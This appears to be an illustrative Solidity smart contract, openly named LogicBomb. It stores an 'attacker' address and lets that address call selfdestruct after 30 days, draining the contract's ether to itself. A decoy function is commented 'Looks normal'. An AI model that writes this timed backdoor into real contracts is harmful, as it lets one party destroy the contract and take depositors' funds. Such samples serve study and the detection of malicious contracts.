pragma solidity ^0.8.21;

contract LogicBomb {
    address public attacker;
    uint256 public deployTime;

    constructor(address _attacker) {
        attacker = _attacker;
        deployTime = block.timestamp;
    }

    function claim() external {
        if (block.timestamp > deployTime + 30 days && msg.sender == attacker) {
            selfdestruct(payable(msg.sender)); // 🔥 Logic Bomb
        }
    }

    function safeAction() external {
        // Looks normal
    }
}
